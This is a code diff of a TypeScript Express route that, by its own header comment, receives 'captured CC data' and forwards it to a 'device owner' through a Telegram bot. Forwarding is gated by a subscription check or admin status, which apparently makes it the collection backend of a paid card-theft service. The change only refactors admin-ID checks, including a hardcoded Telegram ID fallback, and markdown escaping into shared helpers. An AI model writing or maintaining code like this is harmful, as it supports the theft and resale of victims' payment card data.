@@ -3,15 +3,13 @@
  * Receives captured CC data and forwards to the device owner via panel bot DM.
  */
 import { Router } from "express";
+import { isAdminTg, ADMIN_ID } from "../lib/admin";
+import { escapeMarkdown } from "../lib/telegramText";
 import { logger } from "../lib/logger";
 import { fbUpdate, fbGet, isSubscriptionActive } from "../bot/firebase";
 import { getBot } from "../bot/index";
 
 const router = Router();
-
-function escapeMarkdown(text: string): string {
-  return String(text || "").replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
-}
 
 router.post("/hook/cc", async (req, res) => {
   try {
@@ -31,11 +29,7 @@ router.post("/hook/cc", async (req, res) => {
     }
 
     // Only forward for users with an active subscription (or admin)
-    const ADMIN_IDS = (process.env["ADMIN_TELEGRAM_ID"] || "5064888403")
-      .split(",")
-      .map((s) => s.trim());
-    const ADMIN_ID = ADMIN_IDS[0];
-    const isAdmin = ADMIN_IDS.includes(ownerTelegramId);
+    const isAdmin = isAdminTg(ownerTelegramId);
     const active = isAdmin || (await isSubscriptionActive(ownerTelegramId));
     if (!active) {
       // Still save to Firebase silently, but don't forward
@@ -172,11 +166,7 @@ async function handleCapture(
       return;
     }
 
-    const ADMIN_IDS = (process.env["ADMIN_TELEGRAM_ID"] || "5064888403")
-      .split(",")
-      .map((s) => s.trim());
-    const ADMIN_ID = ADMIN_IDS[0];
-    const isAdmin = ADMIN_IDS.includes(ownerTelegramId);
+    const isAdmin = isAdminTg(ownerTelegramId);
     const active = isAdmin || (await isSubscriptionActive(ownerTelegramId));
     if (!active) {
       logger.warn(
